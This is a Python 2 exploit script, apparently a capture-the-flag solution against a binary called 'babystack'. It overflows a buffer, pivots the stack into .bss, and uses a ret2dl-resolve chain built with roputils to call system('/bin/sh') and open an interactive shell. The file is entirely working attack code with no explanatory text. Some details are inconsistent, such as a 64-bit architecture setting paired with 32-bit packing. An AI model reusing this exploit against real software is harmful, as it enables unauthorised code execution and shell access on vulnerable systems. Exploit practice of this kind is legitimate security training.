#!/usr/bin/env python2
from mypwn import *
from ctypes import *
import sys
import roputils


def pwn(ip=None,port=None):

    binary= 'babystack'
    library='libc.so.6'
    context.arch = 'amd64'
    context.log_level='debug'
    elf = ELF(binary)

    if ip==None and port==None:
        io = getio(binary)
        libc=getlib()
        #io = getio(binary,library)
        #libc = ELF(library)
    else:
        io = remote(HOST, PORT)
        libc = ELF(library)

    ##################################

    def ru(delim):
        return io.recvuntil(delim)

    def rn(count):
        return io.recvn(count)

    def sl(data):
        return io.sendline(data)

    def sn(data):
        return io.send(data)

    def uint32(x):
        return c_uint32(x).value

    def sint32(x):
        return c_int32(x).value

    def info(comment,addr):
        print '#### log #####'
        log.info(comment+':%#x',addr)

    ##################################

    at(io,'b *0x8048455\nc\n') # 0x8048455:leave;retn
    #p=cyclic(0x40)
    #sn(p)
    eip='laaa'

    offset = cyclic_find(eip) #cyclic_find('baaacaaa', n=8)
    info('offset',offset)

    #pivot
    leave_ret=0x8048455
    pivot=elf.bss()+0x20
    p1='a'*(offset-4)+p32(pivot)+p32(elf.symbols['read'])+p32(leave_ret)+p32(0)+p32(pivot)+p32(0x30)

    info('p1 len',len(p1))
    assert len(p1)==0x40

    sn(p1)

    # ret2dl
    rop = roputils.ROP(binary)
    addr_bss = pivot+0x40

    buf = p32(0xdeadbeef) # new pivot
    buf += rop.call('read', 0, addr_bss, 100)
    buf += rop.dl_resolve_call(addr_bss+20, addr_bss)
    buf += rop.fill(0x30, buf)

    info('buf len',len(buf))

    sn(buf)

    buf = rop.string('/bin/sh')
    buf += rop.fill(20, buf)
    buf += rop.dl_resolve_data(addr_bss+20, 'system')
    buf += rop.fill(100, buf)

    sn(buf)
    io.interactive()

if __name__=="__main__":
    pwn()

